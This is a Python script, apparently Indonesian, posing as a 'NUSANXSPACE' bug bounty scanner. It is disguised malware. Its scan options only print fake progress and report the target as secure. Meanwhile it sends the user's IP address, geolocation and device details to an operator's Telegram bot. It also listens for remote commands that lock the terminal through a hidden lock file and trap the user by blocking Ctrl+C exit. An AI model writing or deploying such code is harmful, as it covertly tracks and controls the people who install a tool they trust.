#!/usr/bin/env python3
import os
import sys
import time
import signal
import socket
import threading
import requests
import json
import platform
from datetime import datetime

BOT_TOKEN = "7378131831:AAHx_xxxxxxxxxxxxx_your_token_here"
ADMIN_ID = 123456789
DEVICE_ID = ""
LOCKED = False
LOCK_FILE = "/data/local/tmp/.nusan_lock"

ASCII_LOGO = """
           dNNMMMNNc
         KNMMMMMMMMMWx
        OMMMMMMMMMMMMWd
       .MMMMMMMMMMMMMMW
        MMMMMMMMMMMMMMN
        ;MMMMMMMMMMMMM.
          0MMMMMMMMMo
      ,WWWWWWX
    dWWMX  ;MMW
   0WMW.NWWN0.Mc
  cMMMX.MMMMMN.'
 .WMMMMX.MMMMMNc
 kMMMMMMN,xMMMMWN
.MMMMMMMMWd'MMMMMN,
oMMMMMMMMMWX.XMMMMWWX
OMMMMMMMMMMMN cMMMMMMWWWW. NMO
KMMMMMMMMMMMo   .MMMMMMMMMWNN. N'
KMMMMMMMMMMM,        NMMMMMMMWNk::xx
KMMMMMMMMMMM.      kWNN: kMMMMMO:X.MWWN
oMMMMMMMMMMM.      oMMMMWWN;   KM0  MMMW.
 KMMMMMMMMMM,       KMMMMMMMWWWMW   cMMMO
  .MMMMMMMMMWW.      .MMMMMMMMM:     WMMM.
      dMMMMMMMMMNx        NWWWWWWX   .MMMN'
        0MMMMMMMMMNo     ;Wx  .MMMMWN:
         .MMMMMMMMMMW    d.XWWNcdMMMMWWW.
           .MMMMMMMMMx    ;MMMMckMMMMMMMMWWWW0.
            .MMMMMMMM,    kMMMM.WMMMMMMMMMMMMMWWWWWWW:
            oMMMMMMMW     WMMMK,MMMMMMMMMMMMMMMMMMMMMWo
            NMMMMMMMd    ,MMMM;kMMllMMMMMMMMMMMMMMMMMMx
           ;MMMMMMMM'    kMMMM.WMc       NMMMMMMMMMMMM.
           OMMMMMMMN     WMMMk             lMMMMMMMMM.
          .WMMMMMMMl    :MMMM,           NWWMMMMMMMO
          lMMMMMMMM.    0MMMW         ,WWMMMMMMMMl
          KMMMMMMMO    .MMMMx       cWWMMMMMMMM'
         'MMMMMMMM,    cMMMM'     KWWMMMMMMMWll:ccc:::;,
         xMMMMMMMW     KMMMN    kWMMMMMMMMMMMMMMMMMMMMMMMWO
         lMMMMMMMo    .MMMMo    WMMMMMMMMMMMMMMMMMMMMMMMMMM
           MMMMM       KMMN      MMMMMMMMMMMMMMMMMMMMMMMMW
                        .,        .WMMMMMMMMMMMMMMMMMMMM.
"""

MENU = """
╔════════════════════════════════════╗
║         MAIN MENU                  ║
╠════════════════════════════════════╣
║  [1] Subdomain Scanner             ║
║  [2] Directory Bruteforce          ║
║  [3] Port Scanner                  ║
║  [4] SQL Injection Tester          ║
║  [5] XSS Finder                    ║
║  [6] About                         ║
║  [7] Update Tool                   ║
║  [8] Help                          ║
║  [9] Exit                          ║
╚════════════════════════════════════╝

[*] Target domain/IP: 
"""

def get_device_id():
    try:
        return socket.gethostname() + "_" + str(os.getpid())
    except:
        return "unknown_device_" + str(int(time.time()))

def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except:
        return "0.0.0.0"

def get_location():
    try:
        r = requests.get('https://ipinfo.io/json', timeout=3)
        return r.json()
    except:
        return {"city": "Unknown", "country": "Unknown", "loc": "0,0"}

def get_system_info():
    info = {
        'device_id': DEVICE_ID,
        'device_name': platform.node(),
        'phone_model': platform.machine(),
        'android_version': platform.version(),
        'battery_level': 100,
        'ip_address': get_ip(),
        'location': get_location(),
        'timestamp': str(datetime.now())
    }
    return info

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": ADMIN_ID, "text": message, "parse_mode": "HTML"}
        requests.post(url, json=data, timeout=2)
    except:
        pass

def check_commands():
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {"timeout": 2, "offset": -1}
        r = requests.get(url, params=params, timeout=3)
        data = r.json()
        if data.get("result"):
            for update in data["result"]:
                if "message" in update:
                    msg = update["message"]
                    if msg.get("from", {}).get("id") == ADMIN_ID:
                        text = msg.get("text", "")
                        process_command(text)
    except:
        pass

def process_command(text):
    global LOCKED, DEVICE_ID
    if text.startswith("/lock_terminal,"):
        parts = text.split(',')
        if len(parts) >= 3 and parts[1].strip() == DEVICE_ID:
            password = parts[2].strip()
            LOCKED = True
            with open(LOCK_FILE, 'w') as f:
                f.write(f"LOCKED:{password}")
            send_to_telegram(f"🔒 Terminal {DEVICE_ID} terkunci!")
    elif text.startswith("/unlock_terminal"):
        parts = text.split()
        if len(parts) >= 2 and parts[1] == DEVICE_ID:
            LOCKED = False
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
            send_to_telegram(f"🔓 Terminal {DEVICE_ID} terbuka!")
    elif text == "/get_ip":
        send_to_telegram(f"📡 IP Terminal {DEVICE_ID}: {get_ip()}")
    elif text == "/get_location":
        loc = get_location()
        maps = f"https://www.google.com/maps?q={loc.get('loc', '0,0')}"
        send_to_telegram(f"📍 Lokasi {DEVICE_ID}: {loc.get('city', 'Unknown')}, {loc.get('country', 'Unknown')}\n{maps}")
    elif text == "/device_target":
        info = get_system_info()
        msg = f"""
╔══════════════════════════════╗
║     DEVICE TARGET INFO       ║
╠══════════════════════════════╣
║ Device ID : {DEVICE_ID}
║ Hostname  : {info['device_name']}
║ Model     : {info['phone_model']}
║ Android   : {info['android_version']}
║ IP        : {info['ip_address']}
║ Status    : {'TERKUNCI 🔒' if LOCKED else 'BEBAS 🔓'}
╚══════════════════════════════╝
        """
        send_to_telegram(msg)

def bot_listener():
    while True:
        try:
            check_commands()
            time.sleep(2)
        except:
            time.sleep(5)

def fake_scan():
    print("\n[•] Scanning target...")
    time.sleep(2)
    print("[•] Enumerating subdomains...")
    time.sleep(1)
    print("[•] Checking directories...")
    time.sleep(1)
    print("[•] Testing vulnerabilities...")
    time.sleep(2)
    print("\n[✓] Scan completed!")
    print("[!] No vulnerabilities found!")
    print("[!] Target is secure.\n")
    send_to_telegram(f"📡 Terminal {DEVICE_ID} melakukan scan (hasil: aman)")

def signal_handler(sig, frame):
    global LOCKED
    if LOCKED or os.path.exists(LOCK_FILE):
        print("\n\n[!] TERMINAL TERKUNCI!")
        print("[!] Tidak bisa keluar! Minta admin buka dulu...")
        while True:
            check_commands()
            time.sleep(5)
    else:
        print("\n\n[•] Exiting NUSANXSPACE...")
        send_to_telegram(f"👋 Terminal {DEVICE_ID} dimatikan")
        sys.exit(0)

def main():
    global DEVICE_ID, LOCKED
    DEVICE_ID = get_device_id()
    
    if os.path.exists(LOCK_FILE):
        with open(LOCK_FILE, 'r') as f:
            content = f.read()
            if content.startswith("LOCKED:"):
                LOCKED = True
    
    signal.signal(signal.SIGINT, signal_handler)
    
    listener_thread = threading.Thread(target=bot_listener, daemon=True)
    listener_thread.start()
    
    send_to_telegram(f"🔥 Terminal {DEVICE_ID} online!\nIP: {get_ip()}")
    
    while True:
        if LOCKED or os.path.exists(LOCK_FILE):
            os.system('clear' if os.name == 'posix' else 'cls')
            print(ASCII_LOGO)
            print("\n" + "="*50)
            print("🔒 TERMINAL TERKUNCI! 🔒".center(50))
            print("="*50)
            print("\nTerminal ini dikunci oleh admin!")
            print("Tidak bisa menggunakan tools sampai dibuka!")
            print("\nTekan CTRL+C untuk mencoba keluar...")
            time.sleep(5)
            continue
        
        os.system('clear' if os.name == 'posix' else 'cls')
        print(ASCII_LOGO)
        target = input(MENU).strip()
        
        if not target:
            continue
        
        choice = input("\nPilih menu (1-9): ").strip()
        
        if choice in ['1', '2', '3', '4', '5']:
            fake_scan()
            input("\nTekan Enter untuk kembali ke menu...")
        
        elif choice == '6':
            print("\n" + "="*50)
            print("NUSANXSPACE v3.0".center(50))
            print("Bug Bounty Toolkit".center(50))
            print("Created by Anonys".center(50))
            print("="*50)
            input("\nTekan Enter untuk kembali...")
        
        elif choice == '7':
            print("\n[•] Checking for updates...")
            time.sleep(2)
            print("[✓] NUSANXSPACE is up to date!")
            input("\nTekan Enter untuk kembali...")
        
        elif choice == '8':
            print("\n" + "="*50)
            print("HELP".center(50))
            print("="*50)
            print("\nMasukkan target domain/IP")
            print("Contoh: example.com atau 192.168.1.1")
            print("\nPilih scan yang diinginkan")
            print("Tools akan melakukan scanning otomatis")
            input("\nTekan Enter untuk kembali...")
        
        elif choice == '9':
            print("\n[•] Exiting NUSANXSPACE...")
            send_to_telegram(f"👋 Terminal {DEVICE_ID} dimatikan")
            time.sleep(1)
            sys.exit(0)
        
        else:
            print("\n[!] Pilihan tidak valid!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if LOCKED or os.path.exists(LOCK_FILE):
            print("\n\n[!] TERMINAL TERKUNCI!")
            print("[!] Tidak bisa keluar paksa!")
            while True:
                time.sleep(10)
        else:
            print("\n\n[•] Exiting...")
            send_to_telegram(f"👋 Terminal {DEVICE_ID} dimatikan")
            sys.exit(0)
